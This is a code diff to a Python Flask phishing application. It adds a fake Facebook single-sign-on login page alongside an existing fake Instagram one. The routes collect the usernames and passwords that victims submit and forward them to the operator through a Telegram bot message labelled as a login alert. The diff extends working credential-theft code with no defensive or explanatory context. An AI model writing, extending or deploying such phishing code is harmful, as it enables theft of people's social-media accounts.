@@ -6,7 +6,7 @@ import os
 load_dotenv()
 app = Flask(__name__)
 
-def sendTelegram(request):
+def sendTelegram(request, platform):
     # Extracting form data
 
     
@@ -21,12 +21,20 @@ def sendTelegram(request):
     send_message_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
 
     # Crafting the message in Markdown style for better readability
-    message_text = (
-        "🚨 *Login Alert* 🚨\n"
-        "_Someone attempted a login, details below._\n\n"
-        f"*Username:*\n`{username}`\n"
-        f"*Password:*\n`{password}`"
-    )
+    if platform == 'facebook':
+        message_text = (
+            "🚨 *Login Alert from Facebook* 🚨\n"
+            "_Someone attempted a login, details below._\n\n"
+            f"*Username:*\n`{username}`\n"
+            f"*Password:*\n`{password}`"
+        )
+    elif platform == 'instagram':
+        message_text = (
+            "🚨 *Login Alert from Instagram* 🚨\n"
+            "_Someone attempted a login, details below._\n\n"
+            f"*Username:*\n`{username}`\n"
+            f"*Password:*\n`{password}`"
+        )
 
     # Data structure required by Telegram API
     message_data = {
@@ -57,16 +65,27 @@ def authorize():
     # Serve the authorization page on a GET request
     return render_template('authorize.html')
 
-@app.route('/sso/instagram/authorize', methods=['GET', 'POST'])
-def login():
+@app.route('/sso/facebook/authorize', methods=['GET', 'POST'])
+def facebook():
     if request.method == 'POST':
         # Process and handle the login data
-        sendTelegram(request)
+        sendTelegram(request, 'facebook')
         # Redirect to the login page after POST request
-        return redirect(url_for('login'))
+        return redirect(url_for('facebook'))
     else:
         # Serve the login page on a GET request
-        return render_template('login.html')
+        return render_template('facebook.html')
+
+@app.route('/sso/instagram/authorize', methods=['GET', 'POST'])
+def instagram():
+    if request.method == 'POST':
+        # Process and handle the login data
+        sendTelegram(request, 'instagram')
+        # Redirect to the login page after POST request
+        return redirect(url_for('instagram'))
+    else:
+        # Serve the login page on a GET request
+        return render_template('instagram.html')
 
 if __name__ == '__main__':
     # Running the app on the local development server
